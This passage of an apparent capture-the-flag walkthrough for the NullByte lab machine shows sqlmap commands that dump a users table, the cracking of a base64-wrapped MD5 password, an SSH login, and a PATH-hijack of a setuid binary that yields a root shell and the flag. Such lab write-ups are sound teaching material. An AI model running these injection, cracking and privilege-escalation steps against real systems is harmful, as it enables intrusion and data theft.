&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;*&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;shutting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code&gt;python2 sqlmap.py -u 'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plo' --current-db&lt;/code&gt;
got us the name of the current databse: &lt;strong&gt;seth&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python2 sqlmap.py -u 'http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plo' -D seth --tables&lt;/code&gt;
got us the list of the tables in the database &lt;strong&gt;seth&lt;/strong&gt;. There is only one table : &lt;strong&gt;users&lt;/strong&gt;. Let us drop it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$python2 sqlmap.py -u &amp;#39;http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop&amp;#39; -D seth --dump&lt;/span&gt;
&lt;span class="code-line"&gt;+----+---------------------------------------------+--------+------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| id | pass                                        | user   | position   |&lt;/span&gt;
&lt;span class="code-line"&gt;+----+---------------------------------------------+--------+------------+&lt;/span&gt;
&lt;span class="code-line"&gt;| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &amp;lt;blank&amp;gt;    |&lt;/span&gt;
&lt;span class="code-line"&gt;| 2  | --not allowed--                             | isis   | employee   |&lt;/span&gt;
&lt;span class="code-line"&gt;+----+---------------------------------------------+--------+------------+&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It seems that ramses pass(word) is base64 encoded. After decoding, we got:
&lt;strong&gt;c6d6bd7ebf806f43c76acc3681703b81&lt;/strong&gt; which looks like a md5 hash. A simple
google search give us the associated password: &lt;strong&gt;omega&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;We have a username and a password. We have also seen a ssh port at the nmap
stage.&lt;/p&gt;
&lt;h2 id="shell-exploitation"&gt;Shell exploitation&lt;/h2&gt;
&lt;h3 id="ssh"&gt;ssh&lt;/h3&gt;
&lt;p&gt;We try to connect to the non standard ssh port as ramses:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh 192.168.0.20 -p 777 -lramses&lt;/span&gt;
&lt;span class="code-line"&gt;ramses@192.168.0.20&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;omega&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And it works.&lt;/p&gt;
&lt;h3 id="privilege-elevation"&gt;Privilege elevation&lt;/h3&gt;
&lt;p&gt;We got a shell as a user now we need privilege escalation to become root. After
trying &lt;code&gt;sudo su&lt;/code&gt; we look at the &lt;code&gt;bash_history&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ramses&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;NullByte&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bash_history&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;su&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eric&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;clear&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="n"&gt;procwatch&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;clear&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let see the &lt;code&gt;/var/www/backup/&lt;/code&gt; folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ramses&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;NullByte&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rwsr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4932&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;01&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;29&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;procwatch&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Aug&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;01&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;readme&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Interesting, we read the readme.txt file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;ramses&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;NullByte&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;readme&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fix&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mess&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We execute &lt;code&gt;procwatch&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;ramses@NullByte:/var/www/backup$ ./procwatch
  PID TTY          TIME CMD
 1785 pts/0    00:00:00 procwatch
 1786 pts/0    00:00:00 sh
 1787 pts/0    00:00:00 ps&lt;/p&gt;
&lt;p&gt;Seems like a ps, probably executing the command itself. Moreover it is own by root
with the &lt;a href="https://en.wikipedia.org/wiki/Setuid"&gt;suid&lt;/a&gt; set (the s in the &lt;code&gt;ls -l&lt;/code&gt;),
meaning we execute this program with root privileges.&lt;/p&gt;
&lt;p&gt;One classic vulnerability when a program executes another one is to use the PATH
environment variable to execute a command of our choice instead of the command
wanted by the program.&lt;/p&gt;
&lt;p&gt;First of all we create a file with the command we want to execute and name it &lt;code&gt;ps&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ramses@NullByte:/var/www/backup$ echo /bin/sh &amp;gt; ~/ps&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We give the execution right to this file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ramses@NullByte:/var/www/backup$ chmod +x ~/ps&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We add the directory where we created this file to our PATH:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ramses@NullByte:/var/www/backup$ export PATH=~/:$PATH&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We execute the original program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ramses@NullByte:/var/www/backup$ ./procwatch&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Magic happened, we got a root shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# whoami&lt;/span&gt;
&lt;span class="code-line"&gt;root&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now we just need to search the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;proof&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;proof&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;adf11c7a9e6523e630aaf3b9b7acb51d&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;It&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;seems&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;that&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pwned&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;congrats&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Now&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;that&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;wanna&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;talk&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Write&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;walk&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;xly0n&lt;/span&gt;&lt;span class="nv"&gt;@sigaint&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;attach&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;walk&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;proof&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;If&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sigaint&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;may&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nbsly0n&lt;/span&gt;&lt;span class="nv"&gt;@gmail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;USE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;THIS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PGP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;PUBLIC&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;KEY&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-----&lt;/span&gt;&lt;span class="k"&gt;BEGIN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PGP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;PUBLIC&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;KEY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;BLOCK&lt;/span&gt;&lt;span class="o"&gt;-----&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;Version&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;BCPG&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v1&lt;/span&gt;&lt;span class="mf"&gt;.6.1.0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;mQENBFW9BX8BCACVNFJtV4KeFa&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;TgJZgNefJQ&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;fD1&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;LNEGnv5rw3uSV&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;jWigpxrJ&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;e4QU3gZPd&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;VibPhzbJC&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;xhSRTprq&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Cu7OyNC8&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;HKu&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;NpJ7j8mxDTLrvoD&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;z9pmlOJ5Xfhc2xx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;WHtST53Ewk8D&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;Hjn&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;mh4s9&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;pjppdpMFUhr1poXPsI2HTWNe&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;YcvzcQHwzXj6hvtcXlJj&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Y29tiQEcBBABAgAGBQJVvQV&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;AAoJENDZ4VE7RHERJVkH&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;RUeh6qn116Lf5mAScNS&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;HhWTUulxIllPmnOPxB9&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;MI2CCJL44Q&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;J5654vIGn&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;XQk6Oc7xWEgxLH&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;IjNQgh6V&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;MTce8fOp2SEVPcMZZuz2&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;XI9nrCV1dfAcwJJyF58&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;RryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nNCEwQexWrgW7bqL&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;N8&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
